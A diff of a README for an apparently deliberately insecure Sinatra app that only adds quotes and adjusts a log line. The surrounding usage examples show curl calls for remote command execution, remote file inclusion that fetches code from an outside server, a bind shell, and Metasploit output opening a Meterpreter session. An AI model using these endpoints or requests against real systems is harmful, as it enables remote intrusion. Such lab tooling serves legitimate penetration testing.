@@ -17,8 +17,8 @@ Seriously, you do not want to use this. It contains nothing but bad ideas.
 
 ### oneshot command execution
 
-    curl http://doomed:8000/oneshot?cmd=id
-    curl http://doomed:8000/oneshot?cmd=aWQK&encode=base64
+    curl "http://doomed:8000/oneshot?cmd=id"
+    curl "http://doomed:8000/oneshot?cmd=aWQK&encode=base64"
     curl -XPOST -d 'cmd=aWQK&encode=base64' http://doomed:8000/oneshot
 
 ### file upload via PUT
@@ -27,7 +27,7 @@ Seriously, you do not want to use this. It contains nothing but bad ideas.
 
 ### remote file inclusion
 
-    curl http://doomed:8000/rfi?url=http://remote-server/path/to/code.rb
+    curl "http://doomed:8000/rfi?url=http://remote-server/path/to/code.rb"
 
 ### fork a bindshell
 
@@ -60,7 +60,8 @@ Seriously, you do not want to use this. It contains nothing but bad ideas.
     [*] Transmitting intermediate stager for over-sized stage...(105 bytes)
     [*] Sending stage (1495599 bytes) to doomed
     [*] Command stager progress: 100.00% (668/668 bytes)
-    msf exploit(handler) > [*] Meterpreter session 2 opened
+    [*] Meterpreter session 2 opened
+    msf exploit(handler) > 
 ## Contributing
 
 Bug reports and pull requests are welcome on GitHub at https://github.com/ryanbreed/paystub-sinatra. This project is intended to be a safe, welcoming space for collaboration, and contributors are expected to adhere to the [Contributor Covenant](http://contributor-covenant.org) code of conduct.
